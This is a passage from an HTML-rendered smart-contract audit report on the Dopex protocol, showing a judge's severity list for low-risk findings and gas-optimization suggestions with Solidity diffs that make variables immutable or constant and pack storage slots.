class=\"grvsc-source\"><span class=\"mtk1\">    .</span><span class=\"mtk11\">addProceeds</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FundingPaid</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ((</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1033#issuecomment-1755175409\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Severities of each issue:<br>\nUsers can bond without providing WETH<br>\nL<br>\ndecreaseAmount function name is misleading<br>\nL<br>\naddAssetTotokenReserves() doesn’t check that there is no token with the same symbol<br>\nL<br>\nThe removeAssetFromtokenReserves() removes tokens by symbol instead of per address<br>\nL<br>\nApprovals can’t be completely revoked<br>\nL<br>\nUnnecessary role check<br>\nL<br>\nRDPXV2CORE_ROLE is not assigned in PerpetualAtlanticVault<br>\nL<br>\nUnnecessary struct attribute prefix<br>\nRefactor<br>\nRepeated expression<br>\nRefactor<br></p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 10 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1942\">report highlighted below</a> by <strong>c3phas</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1835\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2173\">HHK</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2134\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2123\">pontifex</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2055\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1780\">0xgrbr</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1099\">flacko</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/336\">Sathish9098</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/50\">LeoS</a>.</em></p>\n<h2 id=\"auditors-disclaimer\" style=\"position:relative;\"><a href=\"#auditors-disclaimer\" aria-label=\"auditors disclaimer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Auditor’s Disclaimer</h2>\n<p>While we try our best to maintain readability in the provided code snippets, some functions have been truncated to highlight the affected portions.</p>\n<p>It’s important to note that during the implementation of these suggested changes, developers must exercise caution to avoid introducing vulnerabilities. Although the optimizations have been tested prior to these recommendations, it is the responsibility of the developers to conduct thorough testing again.</p>\n<p>Code reviews and additional testing are strongly advised to minimize any potential risks associated with the refactoring process.</p>\n<h2 id=\"note-on-gas-estimates\" style=\"position:relative;\"><a href=\"#note-on-gas-estimates\" aria-label=\"note on gas estimates permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Note on Gas estimates</h2>\n<p>We’ve tried to give the exact amount of gas being saved from running the included tests whenever the function is within the test coverage.</p>\n<p>Some functions are not covered by the test cases or are internal/private functions. In this case, the gas benchmarks are based on functions that call this internal/private functions.\nSome like packing/immutables we can easily tell the amount being saved based on the number of slots being saved.</p>\n<p><strong>The bot did an amazing job on this audit, but still missed some findings.</strong></p>\n<h2 id=\"g-01-using-immutable-on-variables-that-are-only-set-in-the-constructor-and-never-after-save-8400-gas\" style=\"position:relative;\"><a href=\"#g-01-using-immutable-on-variables-that-are-only-set-in-the-constructor-and-never-after-save-8400-gas\" aria-label=\"g 01 using immutable on variables that are only set in the constructor and never after save 8400 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Using immutable on variables that are only set in the constructor and never after (Save 8400 Gas)</h2>\n<p><strong>This instance was missed by the bot.</strong></p>\n<p><strong>Gas per instance: 2.1K</strong><br>\n<strong>Total Instances: 4</strong><br>\nTotal Gas Saved: <code>2.1 * 4 = 8400 Gas</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L68-L72\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L68-L72</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniV3LiquidityAmo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:  </span><span class=\"mtk3\">// Rdpx address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:  </span><span class=\"mtk3\">// RdpxV2Core address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   // Rdpx address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  address public rdpx;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  address public immutable rdpx;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   // RdpxV2Core address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  address public rdpxV2Core;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  address public immutable rdpxV2Core;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L46\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L46</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVaultLP</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">IPerpetualAtlanticVault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L66-L70\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L66-L70</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVaultLP</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:  </span><span class=\"mtk3\">/// @dev address of rdpx token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev address of rdpx token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  address public rdpx;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  address public immutable rdpx;</span></span></span></code></pre>\n<h2 id=\"g-02-use-a-constant-variable-for-roundingprecision-save-1-slot-21k-gas\" style=\"position:relative;\"><a href=\"#g-02-use-a-constant-variable-for-roundingprecision-save-1-slot-21k-gas\" aria-label=\"g 02 use a constant variable for roundingprecision save 1 slot 21k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Use a constant variable for <code>roundingPrecision</code> (Save 1 SLOT: 2.1k Gas)</h2>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L104\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L104</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">roundingPrecision</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e6</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The variable <code>roundingPrecision</code> is being referenced in two places, see below\n<a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L576-L583\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L576-L583</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">576</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">577</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remainder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\"> % </span><span class=\"mtk12\">roundingPrecision</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">578</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">remainder</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">579</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">580</span><span class=\"mtk1\">:    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">581</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">remainder</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">roundingPrecision</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">582</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">583</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p>Note, at no instance is our variable being modified, we can therefore save the SLOT it’s currently occupying by switching to a constant variable</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/perp-vault/PerpetualAtlanticVault.sol b/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 88ac2b3..fefe065 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -101,7 +101,7 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   uint256 public fundingDuration = 7 days;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev the precision to round up to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  uint256 public roundingPrecision = 1e6;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint256 public  constant roundingPrecision = 1e6;</span></span></span></code></pre>\n<h2 id=\"g-03-tightly-pack-storage-variablesoptimize-the-order-of-variable-declaration\" style=\"position:relative;\"><a href=\"#g-03-tightly-pack-storage-variablesoptimize-the-order-of-variable-declaration\" aria-label=\"g 03 tightly pack storage variablesoptimize the order of variable declaration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Tightly pack storage variables/optimize the order of variable declaration</h2>\n<p>The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to eachother in storage and this will pack the values together into a single 32 byte storage slot (if the values combined are &#x3C;= 32 bytes). If the variables packed together are retrieved together in functions we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a <code>Gwarmaccess (100 gas)</code> versus a <code>Gcoldsload (2100 gas)</code>.\nHere, the storage variables can be tightly packed</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L57-L98\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L57-L98</a></p>\n<h3 id=\"we-can-save-one-more-slot-compared-to-the-botuse-uint40-for-genesis-variable-and-lastupdatetime-and-pack-them-with-collateraltoken----save-2k-gas\" style=\"position:relative;\"><a href=\"#we-can-save-one-more-slot-compared-to-the-botuse-uint40-for-genesis-variable-and-lastupdatetime-and-pack-them-with-collateraltoken----save-2k-gas\" aria-label=\"we can save one more slot compared to the botuse uint40 for genesis variable and lastupdatetime and pack them with collateraltoken    save 2k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>We can save one more slot compared to the bot(use <code>uint40</code> for <code>genesis</code> variable and <code>lastUpdateTime</code> and pack them with <code>collateralToken</code> ) - Save 2k gas</h3>\n<p><strong>Note: The bot didn’t pack the genesis variable: we therefore only count the one slot not found by the bot</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">IERC20WithBurn</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/// @dev genesis timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">genesis</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/// @dev the timestamp of the last update where funding was paid for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastUpdateTime</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev Collateral Token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   IERC20WithBurn public collateralToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    /// @dev genesis timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint40 public genesis;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  /// @dev the timestamp of the last update where funding was paid for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint40 public lastUpdateTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev The precision of the collateral token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   uint256 public collateralPrecision;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -91,12 +96,6 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev the total number of active options</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   uint256 public totalActiveOptions;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  /// @dev genesis timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  uint256 public genesis;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 